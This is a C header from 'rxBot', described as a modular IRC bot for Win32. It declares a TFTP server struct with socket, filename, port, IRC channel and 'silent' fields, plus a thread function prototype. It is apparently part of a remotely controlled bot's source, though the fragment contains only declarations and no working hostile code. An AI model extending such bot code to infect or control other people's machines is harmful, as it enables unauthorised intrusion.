/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifndef NO_TFTPD
typedef struct TFTPD 
{
	SOCKET sock;
	char filename[MAX_PATH];
	char filename2[MAX_PATH];
	char requestname[MAX_PATH];
	int threadnum;
	int threads;
	unsigned short port;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TFTPD;

DWORD WINAPI TftpdThread(LPVOID param);
#endif